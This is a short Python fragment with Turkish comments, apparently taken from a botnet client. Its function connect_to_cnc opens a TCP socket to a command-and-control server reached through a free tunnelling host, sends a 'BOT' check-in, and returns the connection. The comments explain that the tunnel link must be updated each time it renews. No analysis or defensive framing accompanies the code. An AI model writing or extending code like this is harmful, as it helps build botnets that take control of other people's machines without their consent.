# app.py veya bot_logic.py içindeki bağlantı kısmı
def connect_to_cnc():
    # Buradaki linki her tünel yenilediğinde güncellemen gerekir
    CNC_LINK = "qjtni-34-6-91-209.run.pinggy-free.link" 
    CNC_PORT = 10101 # Tünelin dış kapısı
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((CNC_LINK, CNC_PORT))
        s.send("BOT".encode()) # "Ben geldim" mesajı
        return s
    except:
        return None
